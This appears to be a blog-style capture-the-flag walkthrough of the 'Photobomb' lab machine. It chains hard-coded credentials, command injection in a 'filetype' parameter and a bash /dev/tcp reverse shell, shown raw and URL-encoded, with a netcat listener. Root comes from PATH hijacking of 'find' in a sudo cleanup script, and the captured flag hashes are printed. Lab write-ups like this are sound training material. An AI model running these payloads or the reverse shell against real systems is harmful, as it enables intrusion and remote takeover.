Upon initial enumeration on `photobomb.htb` within the page source code you can see there is a script running in the background `photobomb.js`
![image](https://0xc0rvu5.github.io/docs/assets/images/20230116210743.png)

Going to the `Sources` section in the developer tools you can find hard-coded credentials:
![image](https://0xc0rvu5.github.io/docs/assets/images/20230116210833.png)

- After inputting the relevant credentials you will be at:
	- `http://photobomb.htb/printer`
- There is a download functionality.
- After fuzzing the parameters i.e. `photo`, `filetype` and `dimensions` it can be determined that the `filetype` parameter is vulnerable to `command injection`.
- After running an initial `ping -c 10` I wanted to confirm since it is technically `blind command injection` since we cannot see the output of the commands.
- On host:
```bash
sudo tcpdump -i tun0 icmp
```
- Then send a `POST` request with the following `body` content.
```bash
photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=jpg;ping+-c+10+your_ip&dimensions=30x20
```
- After confirmation and some additional trial an error, right before attempting to hop on another machine to utilize burp collaborator and it's functionality, I utilized the `Encode/Decode/Hash` functionality on `Zap` and encoded the following text:
```bash
bash -c 'exec bash -i &>/dev/tcp/10.10.16.33/4444 <&1'
```
- To:
```bash
bash+-c+%27exec+bash+-i+%26%3E%2Fdev%2Ftcp%2F10.10.16.33%2F4444+%3C%261%27
```
- For some reason using the `brave` browser plug-in for `hack-tools` the url-encoding did not work. Anyways this successfully allowed for a reverse shell. Just make sure the proper `nc` listener is set up on the host machine via:
```bash
rlwrap nc -lvnp 4444
```
- To allow for better shell functionality:
- This isn't necessary since we already have a `bash` shell, but for some reason my terminal was acting strange so this allowed the terminal to span the entire screen.
- After checking if `python` was enabled via `python3 --version` it can be executed with no issues.
**create bash shell on new server**  
`python3 -c 'import pty;pty.spawn("/bin/bash")'`
**Gives access to clear**
`export TERM=xterm
**background shell**  
`Ctrl+Z`
**turns off own terminal echo which gives access to tab autocompletes, the arrow keys, and Ctrl+C & foregrounds the shell**  
`stty raw -echo; fg`
- The current user will be `wizard` and you can immediately obtain the `user.txt` flag
```bash
cd
cat user.txt

07521826fabfc84c3cd310cc488f2f3f
```

- After initial enumeration:
- We can see that `sudo -l` allows us to execute `/opt/cleanup.sh`
```bash
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```
- Here is what it does:
```bash
cat cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

 Let's install `linpeas.sh` 
```bash
cd /tmp
```
- On host ensure you have `linpeas.sh` in the current directory
- I have mine in `~/Downloads/temp`
```bash
cd ~/Downloads/temp
python3 -m http.server
```
- On `wizard`
```bash
wget http://your_ip:8000/linpeas.sh
chmod 700 linpeas.sh
./linpeas.sh > /home/wizard/out.file
```

- Notice the `crontab` file executing every `5` minutes on the hour:
```bash
*/5 * * * * sudo /opt/cleanup.sh
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230116213438.png)

- Take note that the `find` executable is being ran from a `relative` path i.e. `find` instead of `/usr/bin/find`.
- This means we can manipulate the path in which it executes to escalate privileges
- Here is a warning in `linpeas.sh` as well:
![image](https://0xc0rvu5.github.io/docs/assets/images/20230116213652.png)

- Here is a list of world-writable folders:
```bash
find / -writable -type d 2>/dev/null

/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/gpg-agent.service
/dev/mqueue
/dev/shm
/tmp
/tmp/.XIM-unix
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.X11-unix
/tmp/.Test-unix
/tmp/tmux-1000
/var/tmp
/var/crash
/home/wizard
/home/wizard/.gem
/home/wizard/.gem/specs
/home/wizard/.gem/specs/rubygems.org%443
/home/wizard/.gem/specs/rubygems.org%443/quick
/home/wizard/.gem/specs/rubygems.org%443/quick/Marshal.4.8
/home/wizard/.gem/ruby
/home/wizard/.gem/ruby/2.7.0
/home/wizard/.gem/ruby/2.7.0/cache
/home/wizard/photobomb
/home/wizard/photobomb/public
/home/wizard/photobomb/public/ui_images
/home/wizard/photobomb/source_images
/home/wizard/photobomb/resized_images
/home/wizard/photobomb/log
/home/wizard/.cache
/home/wizard/.local
/home/wizard/.local/share
/home/wizard/.local/share/nano
/home/wizard/.gnupg
/home/wizard/.gnupg/private-keys-v1.d
/proc/22684/task/22684/fd
/proc/22684/fd
/proc/22684/map_files
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/run/user/1000/systemd/units
/run/screen
/run/lock
```

- `/tmp` will do just fine
```bash
cd temp
```
- Let's make the binary which will elevate our privlieges:
```bash
echo "/bin/bash" > find
chmod 777 find
```
- Now run the following command pre-fixed with `sudo`:
```bash
sudo PATH=/tmp:$PATH /opt/cleanup.sh
```
- Voila!!! Root!
```bash
cat /home/wizard/user.txt

07521826fabfc84c3cd310cc488f2f3f

cat /root/root.txt

d223b7b2cabac9d71542dc9e7481222f
```

#hacking
